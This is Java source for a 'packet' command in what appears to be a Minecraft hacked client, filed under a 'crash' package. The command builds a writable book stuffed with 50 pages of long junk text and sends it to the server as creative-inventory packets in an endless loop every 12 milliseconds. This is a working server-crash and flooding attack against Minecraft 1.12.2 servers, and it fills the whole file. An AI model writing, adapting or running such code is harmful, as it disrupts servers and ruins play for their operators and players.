package neko.itskekoffcode.hclient.commands.impl.crash;

import neko.itskekoffcode.hclient.commands.Command;
import neko.itskekoffcode.clientapi.utils.ThreadUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;

public class PacketCommand extends Command {
    @Override
    public void execute(String[] args) throws Exception {
        (new Thread(() -> {
            try {
                PacketCommand.msg("Launched packet thread!", true);
                ItemStack bookObj = new ItemStack(Items.WRITABLE_BOOK);
                NBTTagList list = new NBTTagList();
                NBTTagCompound tag = new NBTTagCompound();
                String author = Minecraft.getMinecraft().getSession().getUsername();
                for (int i = 0; i < 50; ++i) {
                    NBTTagString tString = new NBTTagString("wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5");
                    list.appendTag(tString);
                }

                tag.setString("author", author);
                tag.setString("title", "Title");
                tag.setTag("pages", list);
                bookObj.setTagInfo("pages", list);
                bookObj.setTagCompound(tag);

                while (true) {
                    Minecraft.getMinecraft().getConnection().sendPacket(new CPacketCreativeInventoryAction(36, bookObj));
                    ThreadUtils.sleep(12L);
                }
            } catch (Exception var10) {
                var10.printStackTrace();
            }
        })).start();
    }

    @Override
    public String getName() {
        return "packet";
    }

    @Override
    public String getDescription() {
        return "sending book packets like jessica 1.12.2";
    }

    @Override
    public String getUsage() {
        return "packet";
    }
}
